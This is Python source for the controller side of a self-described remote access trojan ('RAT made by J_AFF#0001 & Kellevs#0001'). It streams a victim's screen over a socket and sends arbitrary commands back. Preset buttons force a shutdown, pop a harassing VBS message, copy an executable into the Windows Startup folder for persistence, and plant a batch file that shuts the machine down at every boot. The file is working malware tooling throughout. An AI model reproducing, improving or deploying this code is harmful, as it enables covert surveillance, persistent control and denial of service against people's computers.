import socket
import threading
import cv2
import numpy as np
import tkinter as tk
from PIL import Image, ImageTk

HOST = "127.0.0.1"
PORT = 12345
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen()

def update_frame():
    while True:
        try:
            img_size = int.from_bytes(client.recv(8), byteorder='big')
            img_data = b''
            while len(img_data) < img_size:
                chunk = client.recv(img_size - len(img_data))
                if not chunk:
                    break
                img_data += chunk
            if not img_data:
                break

            frame = cv2.imdecode(np.frombuffer(img_data, dtype=np.uint8), cv2.IMREAD_COLOR)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)

            img = ImageTk.PhotoImage(image=Image.fromarray(frame))

            image_label.configure(image=img)
            image_label.image = img
        except Exception as e:
            print('Fehler bei der Aktualisierung des Bildschirms:', str(e))
            break

def send_command():
    command = command_entry.get()
    client.sendall(command.encode())

def close_connection():
    client.close()
    window.destroy()

def clear_action():
    command_entry.delete(0, tk.END)

def button1_action():
    command_entry.delete(0, tk.END)
    command_entry.insert(0, 'shutdown /s /t 20')
    send_command()
    command_entry.delete(0, tk.END)
def button2_action():
    command_entry.delete(0, tk.END)
    command_entry.insert(0, 'echo MsgBox "Add me Kellevs#0001" > hallöchen.vbs && start hallöchen.vbs')
    send_command()
    command_entry.delete(0, tk.END)
def button3_action():
    command_entry.delete(0, tk.END)
    command_entry.insert(0, 'copy "%userprofile%\Downloads\RakieV2.exe" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"')
    send_command()
    command_entry.delete(0, tk.END)
def button4_action():
    command_entry.delete(0, tk.END)
    command_entry.insert(0, 'echo Set speech = CreateObject("SAPI.SpVoice"): speech.Speak "hallo" > hello.vbs & cscript //NoLogo hello.vbs & del hello.vbs')
    send_command()
    command_entry.delete(0, tk.END)

def button5_action():
    command_entry.delete(0, tk.END)
    command_entry.insert(0, 'echo shutdown -s -t 0 >"%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\shutdown.bat"')
    send_command()
    command_entry.delete(0, tk.END)

def button6_action():
    command_entry.delete(0, tk.END)
    command_entry.insert(0, 'del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\shutdown.bat"')
    send_command()
    command_entry.delete(0, tk.END)

window = tk.Tk()
window.title('RAT made by J_AFF#0001 & Kellevs#0001')

background_frame = tk.Frame(window)
background_frame.grid(row=0, column=0, rowspan=6, columnspan=3, padx=5)


image_label = tk.Label(window)
image_label.grid(row=0, column=1, columnspan=2)

command_frame = tk.Frame(window)
command_frame.grid(row=1, column=0, columnspan=2, padx=5)

command_entry = tk.Entry(command_frame, width=150, bg='#BDBDBD')
command_entry.pack(fill='y', padx=5)

send_button = tk.Button(command_frame, text='Senden', command=send_command)
send_button.pack(side='right', padx=5)



buttons_frame = tk.Frame(window)
buttons_frame.grid(row=0, column=0, rowspan=6, padx=5)

button1 = tk.Button(buttons_frame, text='Shutdown', command=button1_action, width=15, height=2, bg='grey')
button1.pack(pady=7)

button2 = tk.Button(buttons_frame, text='VBS Error', command=button2_action, width=15, height=2, bg='grey')
button2.pack(pady=7)

button3 = tk.Button(buttons_frame, text='Start up', command=button3_action, width=15, height=2, bg='grey')
button3.pack(pady=7)

button4 = tk.Button(buttons_frame, text='Say Hello', command=button4_action, width=15, height=2, bg='grey')
button4.pack(pady=7)

button6 = tk.Button(buttons_frame, text='Start SD', command=button5_action, width=15, height=2, bg='grey')
button6.pack(pady=7)

button7 = tk.Button(buttons_frame, text='del auto SD', command=button6_action, width=15, height=2, bg='grey')
button7.pack(pady=7)

button5 = tk.Button(buttons_frame, text='Clear', command=clear_action, width=15, height=2, bg='grey')
button5.pack(pady=7)

window.protocol("WM_DELETE_WINDOW", close_connection)
client, addr = server.accept()
print('Verbunden mit:', addr)
update_frame_thread = threading.Thread(target=update_frame)
update_frame_thread.daemon = True
update_frame_thread.start()

window.mainloop()